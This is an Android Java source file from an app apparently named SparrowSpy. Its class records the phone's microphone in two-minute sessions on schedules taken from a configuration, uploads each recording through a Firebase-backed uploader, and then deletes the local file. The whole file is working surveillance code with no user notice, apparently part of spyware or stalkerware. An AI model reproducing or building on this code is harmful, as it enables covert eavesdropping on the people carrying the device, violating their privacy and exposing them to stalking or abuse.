package com.tangledbytes.sparrowspy.services.sparrowservice;

import android.media.MediaRecorder;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.google.firebase.storage.UploadTask;
import com.tangledbytes.sparrowspy.server.DataUploader;
import com.tangledbytes.sparrowspy.utils.Constants;
import com.tangledbytes.sparrowspy.utils.SparrowConfiguration;
import com.tangledbytes.sparrowspy.utils.Utils;

import org.threeten.bp.Duration;
import org.threeten.bp.LocalTime;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class AudioCollectorAndManager {
    private static final String TAG = "AudioCollectorAndManager";
    private static final int TWO_MINUTES_MS = 2 * 60 * 1000;
    private MediaRecorder mediaRecorder;
    private final Handler handler;
    private final DataUploader dataUploader;
    private SparrowConfiguration config;
    private final AtomicBoolean recording = new AtomicBoolean(false);
    private final AtomicBoolean shouldRecord = new AtomicBoolean(true);

    public AudioCollectorAndManager(SparrowService sparrowService) {
        this.handler = new Handler(Looper.getMainLooper());
        this.dataUploader = new DataUploader(sparrowService);
    }

    /**
     * Starts a recording session for a specified duration (default 2 minutes) and handles uploading
     */
    public void startRecordingSession() {
        Log.i(TAG, "Recording session initiated");
        File outputFile = generateAudioFile();
        startRecording(outputFile.getAbsolutePath());

        // Schedule stop after 2 minutes and subsequent upload
        handler.postDelayed(() -> {
            stopRecording();
            uploadAudioFile(outputFile);
            scheduleNextRecording();
        }, TWO_MINUTES_MS);
    }

    /**
     * Uploads the recorded audio file and deletes the file after a successful upload
     */
    private void uploadAudioFile(File audioFile) {
        if (audioFile == null || !audioFile.exists()) {
            Log.e(TAG, "Audio file does not exist, upload aborted");
            return;
        }

        Log.i(TAG, "Audio file prepared for upload");
        UploadTask audioFileUploadTask = dataUploader.uploadAudio(audioFile);
        audioFileUploadTask.addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                Log.i(TAG, "Audio file uploaded successfully");
                if (audioFile.delete()) {
                    Log.i(TAG, "Audio file deleted after upload");
                } else {
                    Log.e(TAG, "Failed to delete audio file after upload");
                }
            } else {
                Log.e(TAG, "Audio upload failed", task.getException());
            }
        });
    }

    /**
     * Schedules the next recording session based on the configuration
     */
    private void scheduleNextRecording() {
        if (!shouldRecord.get() || config == null || !config.uploadAudio) {
            Log.i(TAG, "Recording disabled or configuration invalid, stopping");
            recording.set(false);
            return;
        }
        recording.set(true);
        long delay = getDelayUntilNextRecordingTimeMillis();
        if (delay >= 0) {
            handler.postDelayed(this::startRecordingSession, delay);
        } else {
            Log.i(TAG, "No valid recording time slots, skipping");
        }
    }

    /**
     * Prepares and starts the recording
     */
    private void startRecording(String outputFile) {
        if (mediaRecorder != null) stopRecording();  // Ensure no lingering recorder

        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        mediaRecorder.setOutputFile(outputFile);

        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
            Log.i(TAG, "Recording started");
        } catch (IOException e) {
            Log.e(TAG, "Failed to start recording", e);
        }
    }

    /**
     * Stops the recording
     */
    private void stopRecording() {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                Log.i(TAG, "Recording stopped");
            } catch (RuntimeException e) {
                Log.e(TAG, "Error stopping recorder, it might not have been started properly", e);
            } finally {
                mediaRecorder = null;
            }
        }
    }

    /**
     * Generates a new audio file for saving the recording
     */
    private File generateAudioFile() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.getDefault());
        return new File(Constants.DIR_AUDIO, sdf.format(new Date()) + ".m4a");
    }

    /**
     * Calculates the delay until the next recording time slot
     */
    private long getDelayUntilNextRecordingTimeMillis() {
        if (config == null) {
            Log.e(TAG, "Configuration is null");
            return -1;
        }

        List<LocalTime[]> recordTimes = config.getAudioRecordTimes();
        if (recordTimes.isEmpty()) {
            Log.w(TAG, "No recording times available in configuration");
            return -1;
        }

        LocalTime currentTime = LocalTime.now();
        long shortestDelay = Long.MAX_VALUE;

        for (LocalTime[] timeSlot : recordTimes) {
            if (currentTime.isAfter(timeSlot[0]) && currentTime.isBefore(timeSlot[1])) {
                return 0;  // Already in a recording slot
            } else if (currentTime.isBefore(timeSlot[0])) {
                shortestDelay = Math.min(shortestDelay, Duration.between(currentTime, timeSlot[0]).toMillis());
            }
        }

        if (shortestDelay == Long.MAX_VALUE) {  // No time slot left today
            shortestDelay = Duration.between(currentTime, LocalTime.MAX)
                    .plus(Duration.between(LocalTime.MIDNIGHT, recordTimes.get(0)[0]))
                    .toMillis();
        }

        return shortestDelay;
    }

    /**
     * Handles configuration changes, waits for previous recordings to stop, and schedules new ones
     */
    public void onConfigChanged(SparrowConfiguration config) {
        if (config == null) {
            Log.e(TAG, "Config is null, aborting update");
            return;
        }

        new Thread(() -> {
            Log.i(TAG, "Waiting for previous recordings to finish");
            shouldRecord.set(false);

            while (recording.get()) {
                Utils.sleep(250);
            }

            Log.i(TAG, "Config changed, scheduling new recordings");
            this.config = config;
            shouldRecord.set(true);
            handler.post(this::scheduleNextRecording);
        }).start();
    }
}
